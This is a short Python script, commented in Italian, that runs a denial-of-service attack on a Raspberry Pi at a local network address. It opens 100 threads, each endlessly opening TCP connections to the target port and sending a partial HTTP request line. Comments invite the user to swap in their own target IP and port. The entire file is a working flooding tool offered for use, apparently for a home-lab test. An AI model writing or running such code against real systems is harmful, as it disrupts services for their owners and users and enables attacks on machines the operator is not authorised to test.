import socket
import threading

# Imposta l'indirizzo IP e la porta del Raspberry Pi
target_ip = "192.168.1.128"  # Sostituisci con l'indirizzo IP del Raspberry Pi
target_port = 9090  # Sostituisci con la porta su cui il server è in ascolto

# Funzione per inviare richieste continue
def dos_attack():
    while True:
        try:
            # Creazione di un socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            # Invia pacchetti al bersaglio
            s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
            s.close()
        except socket.error:
            print("Connessione fallita.")

# Creazione di thread multipli per incrementare l'intensità
for i in range(100):  # Numero di thread per intensificare l'attacco
    thread = threading.Thread(target=dos_attack)
    thread.start()